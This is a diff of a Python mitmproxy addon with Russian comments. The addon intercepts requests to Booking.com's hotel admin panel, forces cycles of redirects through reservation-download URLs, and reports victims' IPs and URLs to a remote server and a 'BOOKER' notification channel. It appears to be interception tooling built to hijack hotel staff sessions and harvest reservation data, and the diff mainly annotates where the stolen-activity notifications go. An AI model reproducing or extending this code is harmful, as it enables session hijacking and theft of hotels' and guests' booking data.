@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from mitmproxy import http, ctx
 import os
 import urllib.parse
@@ -208,7 +209,7 @@ def get_redirect_target():
                 if target and target.startswith(('http://', 'https://')):
                     return target
                 else:
-                    log(f"Invalid redirect target in file: '{target}'")
+                    log(f"No valid redirect target in file: '{target}'")
         log("No valid redirect target found, returning empty string")
         return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com
     except Exception as e:
@@ -806,7 +807,8 @@ def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F18] Traceback: {traceback.format_exc()}")
         return False
 
-# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 С ПОЛНЫМ ЛОГИРОВАНИЕМ ==========
+# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
+# ========== ВСЕ УВЕДОМЛЕНИЯ ОТПРАВЛЯЮТСЯ В КАНАЛ BOOKER! ==========
 def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 27: УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18
@@ -816,6 +818,8 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
     3. Затем запускает следующий цикл с новыми параметрами
     4. Проходит по всем введенным комбинациям
     5. ПОЛНОЕ ЛОГИРОВАНИЕ как в функции 18 (начало, завершение с URL, пост-редиректы)
+    
+    ВАЖНО: ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!
     """
     try:
         # ====== ПРОВЕРКА АКТИВАЦИИ ФУНКЦИИ 27 ======
@@ -903,7 +907,7 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
                             target_url = "https://admin.booking.com/hotel/hoteladmin/"
                             log(f"[F27] ✓ Cycle {current_index+1}: 10s timeout reached - auto-redirect")
                             
-                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА
+                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА - ВСЕ УВЕДОМЛЕНИЯ ИДУТ В BOOKER!
                             log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_AUTO")
                             
                             flow.response = http.Response.make(
@@ -925,7 +929,7 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
                             
                             target_url = "https://admin.booking.com/hotel/hoteladmin/"
                             
-                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА
+                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА - ВСЕ УВЕДОМЛЕНИЯ ИДУТ В BOOKER!
                             log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_REFRESH")
                             
                             flow.response = http.Response.make(
@@ -969,6 +973,7 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
             log(f"[F27] ✓ Cycle {current_index+1} completion time saved for IP {client_ip}")
             
             # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ ЦИКЛА (С ПОЛНЫМ URL - КАК ФУНКЦИЯ 18)
+            # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
             send_function_complete_notification(client_ip, full_url, f"FUNCTION_27_CYCLE_{current_index+1}_COMPLETE")
             
             # ====== ЗАПУСКАЕМ СЛЕДУЮЩИЙ ЦИКЛ ЧЕРЕЗ МИНУТУ ======
@@ -1017,6 +1022,7 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
             else:
                 # Все циклы завершены - ОТПРАВЛЯЕМ ФИНАЛЬНОЕ УВЕДОМЛЕНИЕ
                 log(f"[F27] ✓ ALL CYCLES COMPLETED! Total: {next_index} cycles")
+                # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
                 send_function_complete_notification(client_ip, "ALL_CYCLES", "FUNCTION_27_ALL_CYCLES_COMPLETE")
                 remove_booking_reservations_cycle_flag()
             
@@ -1048,6 +1054,7 @@ def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F27] ✓ Using hotel_id={current_hotel_id}, report_id={current_report_id}")
         
         # ПОЛНОЕ ЛОГИРОВАНИЕ НАЧАЛА ЦИКЛА (КАК В ФУНКЦИИ 18)
+        # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
         log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_START")
         
         flow.response = http.Response.make(
@@ -1931,6 +1938,7 @@ def request(flow: http.HTTPFlow) -> None:
     
     # ========== ПРИОРИТЕТ 2.5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
     # НОВАЯ ФУНКЦИЯ С ПОЛНЫМ ЛОГИРОВАНИЕМ
+    # ВАЖНО: ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!
     if host.endswith("admin.booking.com"):
         if booking_reservations_cycle_redirect(flow):
             return
@@ -2031,5 +2039,4 @@ def request(flow: http.HTTPFlow) -> None:
     log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
     flow.response = http.Response.make(
         302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
-
     )
